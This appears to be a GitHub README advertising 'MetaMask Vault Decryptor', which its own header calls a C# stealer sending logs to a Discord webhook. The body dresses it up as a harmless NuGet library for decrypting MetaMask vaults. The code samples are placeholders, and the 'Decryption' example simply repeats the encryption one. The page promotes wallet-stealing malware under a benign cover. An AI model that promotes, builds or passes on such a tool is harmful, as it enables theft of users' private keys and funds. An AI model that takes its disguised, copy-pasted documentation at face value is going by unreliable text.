<p align="center">
  <img width="40%" src="metamask234good.webp"> <br>
  <b>MetaMask Vault Decryptor</b> <br>
  <i>Stealer written on C#, logs will be sent to your Discord channel using a webhook.</i>
</p>

MetaMaskCrypto is a C# library that provides functionality for decrypting vaults encrypted by MetaMask. It allows you to securely access encrypted private keys and other sensitive information stored in your MetaMask vault.

## Features

- Decryption of MetaMask vaults
- Retrieval of encrypted private keys and other sensitive information

## Installation

MetaMaskCrypto can be easily installed via [NuGet](https://www.nuget.org/). Follow the steps below to install the library in your project:

1. Open the NuGet Package Manager Console in Visual Studio or the terminal in your project directory.
2. Run one of the following commands:

```bash
Install-Package MetaMaskCrypto
```
## Usage

To use MetaMaskCrypto in your project, follow the example code below:

### Encryption

```csharp
using MetaMaskCrypto;

class Program
{
    static void Main()
    {
        // Initialize MetaMaskCrypto
        MetaMaskCryptoManager cryptoManager = new MetaMaskCryptoManager();

        // Provide the private key to encrypt
        string privateKey = "<your private key>";

        // Provide the user's password
        string password = "<user's password>";

        // Encrypt the private key
        string encryptedPrivateKey = cryptoManager.EncryptPrivateKey(privateKey, password);

        // Use the encrypted private key for further operations
        // ...

        // Clear the encrypted private key from memory when done
        MetaMaskCryptoUtils.ClearSensitiveData(encryptedPrivateKey);
    }
}
```


### Decryption

```csharp
using MetaMaskCrypto;

class Program
{
    static void Main()
    {
        // Initialize MetaMaskCrypto
        MetaMaskCryptoManager cryptoManager = new MetaMaskCryptoManager();

        // Provide the private key to encrypt
        string privateKey = "<your private key>";

        // Provide the user's password
        string password = "<user's password>";

        // Encrypt the private key
        string encryptedPrivateKey = cryptoManager.EncryptPrivateKey(privateKey, password);

        // Use the encrypted private key for further operations
        // ...

        // Clear the encrypted private key from memory when done
        MetaMaskCryptoUtils.ClearSensitiveData(encryptedPrivateKey);
    }
}
```

## Contributing

Contributions to MetaMaskCrypto are welcome! If you find any issues or have suggestions for improvements, please feel free to open an issue or submit a pull request on the [GitHub repository](https://github.com/your-repository).

To contribute to the project, follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make the necessary changes in your branch.
4. Commit your changes and push the branch to your fork.
5. Submit a pull request to the `main` branch of the main repository.

Please ensure that your contributions adhere to the coding standards, and include relevant documentation and tests if applicable.

## License

This project is licensed under the [MIT License](https://opensource.org/licenses/MIT). See the [LICENSE](https://github.com/your-repository/blob/main/LICENSE) file for more details.
